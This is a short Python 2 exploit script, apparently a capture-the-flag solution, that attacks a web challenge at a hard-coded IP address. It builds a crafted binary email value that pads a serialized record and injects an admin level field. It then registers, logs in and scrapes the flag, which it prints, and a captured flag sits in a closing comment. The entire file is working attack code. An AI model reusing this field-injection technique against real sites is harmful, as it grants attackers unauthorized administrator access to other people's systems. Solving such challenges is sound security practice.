import re
import random
import urllib
import hashlib
import requests

_target = 'http://52.78.188.150/rbsql_4f6b17dc3d565ce63ef3c4ff9eef93ad/'
_pw = 'pass'
_uid = str(random.randint(1000, 9999))

mail = '\x01\x20' + hashlib.md5(_pw).hexdigest()
lvl = '\x01\x012'  # lvl === '2' => admin

pad_len = 256 - (len(mail) + len(lvl) + 2)
ip = '\x01' + chr(pad_len) + 'A'*pad_len

payload = mail + ip + lvl

print '[+] UID:      ' + _uid
print '[+] Password: ' + _pw
print '[+] Payload:  ' + urllib.quote(payload)

s = requests.Session()
s.post(_target+'?page=join_chk', data={"uid": _uid, "umail": payload, "upw": _pw})
s.post(_target+'?page=login_chk', data={"uid": _uid, "upw": _pw})
resp = s.get(_target+'?page=me')

flag = re.search('FLAG\{([^}]+)\}', resp.text).group(1)
print '[+] Flag:     FLAG{{{}}}'.format(flag)

# FLAG{akaneTsunemoriIsSoCuteDontYouThinkSo?}